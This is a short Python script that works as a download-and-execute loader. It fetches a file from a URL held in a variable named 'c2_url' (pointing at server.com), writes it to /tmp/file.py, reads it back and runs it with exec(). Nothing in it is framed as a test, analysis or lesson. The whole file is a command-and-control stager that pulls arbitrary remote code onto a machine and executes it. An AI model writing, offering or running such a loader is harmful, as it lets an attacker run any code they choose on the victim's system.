import requests
import os

def download_code(url):
    response = requests.get(url)
    return response.text

def write_code_to_file(file_path, code):
    with open(file_path, "w") as f:
        f.write(code)

def read_code_from_file(file_path):
    with open(file_path, "r") as f:
        return f.read()

def execute_code(script):
    exec(script)

def main():
    c2_url = "http://server.com/file.py"
    temp_file = "/tmp/file.py"
    
    code = download_code(c2_url)
    write_code_to_file(temp_file, code)
    script = read_code_from_file(temp_file)
    execute_code(script)

main()
